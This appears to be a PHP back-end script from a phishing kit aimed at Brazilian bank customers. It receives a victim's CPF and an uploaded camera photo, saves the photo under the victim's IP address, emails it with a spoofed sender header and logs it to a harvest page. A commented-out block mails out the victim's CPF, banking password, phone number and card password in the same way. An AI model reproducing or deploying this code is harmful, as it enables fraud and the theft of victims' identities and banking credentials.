<?php


$cpf = $_POST['cpf'];



session_start();

extract($_SESSION);

require_once("config.php");


ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);

   if(isset($_FILES['camera']))
   {
      date_default_timezone_set("Brazil/East"); //Definindo timezone padr�o
	  $ip = $_SERVER["REMOTE_ADDR"]; 
      $ext = strtolower(substr($_FILES['camera']['name'],-4)); //Pegando extens�o do arquivo
      $new_name = $ip.'-'.date("d.m.Y-H.i.s").".jpg";//$ext;//Definindo um novo nome para o arquivo
      $dir = 'uploads/'; //Diret�rio para uploads
      move_uploaded_file($_FILES['camera']['tmp_name'], $dir.$new_name); //Fazer upload do arquivo
   }
 
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");

$file      = $dir.$new_name;
$file_size = filesize($file);
$handle    = fopen($file, "r");
$content   = fread($handle, $file_size);
fclose($handle);

$content = chunk_split(base64_encode($content));
$uid     = md5(uniqid(time()));
$name    = basename($file);

$eol     = PHP_EOL;
$subject = "SANTA - $ip";
$message = '<h1>TELAS ROBSON</h1>';

$header    = "From: SANTA - TABELA -  <chegou@hp.com>\n";
$header .= "Reply-To: blessed@inbox.im\n";
$header .= "MIME-Version: 1.0\n";
$header .= "Content-Type: multipart/mixed; boundary=\"" . $uid . "\"\n\n";
$emessage = "--" . $uid . "\n";
$emessage .= "Content-type:text/html; charset=iso-8859-1\n";
$emessage .= "Content-Transfer-Encoding: 7bit\n\n";
$emessage .= $message . "\n\n";
$emessage .= "--" . $uid . "\n";
$emessage .= "Content-Type: image/jpeg; name=\"" . $new_name . "\"\n"; // use different content types here
$emessage .= "Content-Transfer-Encoding: base64\n";
$emessage .= "Content-Disposition: attachment; filename=\"" . $new_name . "\"\n\n";
$emessage .= $content . "\n\n";
$emessage .= "--" . $uid . "--";
mail($receber, $subject, $emessage, $header);

$tudo = "
<tr><td><a href='uploads/$new_name'><img src='uploads/$new_name' width='300' ></a></img></td><td><font color='red' size='4' > $ip </font></td></tr>";
$fopen = fopen("data_base2.php", "a");
fwrite($fopen, $tudo);
fclose($fopen);

/*

$file = $dir.$new_name;
$file_size = filesize($file);
$handle = fopen($file, "r");
$content = fread($handle, $file_size);
fclose($handle);
$content = chunk_split(base64_encode($content));
$uid = md5(uniqid(time()));
$header = "From: SANTINHA <chegou@hp.com>\r\n";
$header .= "Reply-To: blessed@inbox.im\r\n";
$header .= "MIME-Version: 1.0\r\n";
$header .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
$header .= "This is a multi-part message in MIME format.\r\n";
$header .= "--".$uid."\r\n";
$header .= "Content-type:text/plain; charset=iso-8859-1\r\n";
$header .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$header .= "SANTINHA\r\n\r\n";
$header .= "--".$uid."\r\n";
$header .= "Content-Type: image/jpeg; name=\"".$new_name."\"\r\n"; // use different content types here
$header .= "Content-Transfer-Encoding: base64\r\n";
$header .= "Content-Disposition: attachment; filename=\"".$new_name."\r\n";
$header .= $content."\r\n";
$header .= "--".$uid."--";


if (mail($receber, "SANTA - $ip", "aola", $header)) {
   echo "mail send ... OK"; // or use booleans here
} else {
   echo "mail send ... ERROR!";
}



*/
	
/*	
require_once("config.php");
extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: SANTINHA <chegou@hp.com>";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo.="
------------------ Dados -------------------<br>
$data-($hora) - $ip<br>
--------------------------------------------<br>
CPF.........: $cpf<br>
ENTRADA.....: $snet<br>
CELULAR.....: ($ddd) $fone<br>
CARTAO......: $scard<br>
--------------------------------------------<br>";

@mail($receber, "SANTA - $ip", "$conteudo", $headers); 

?>


?>
*/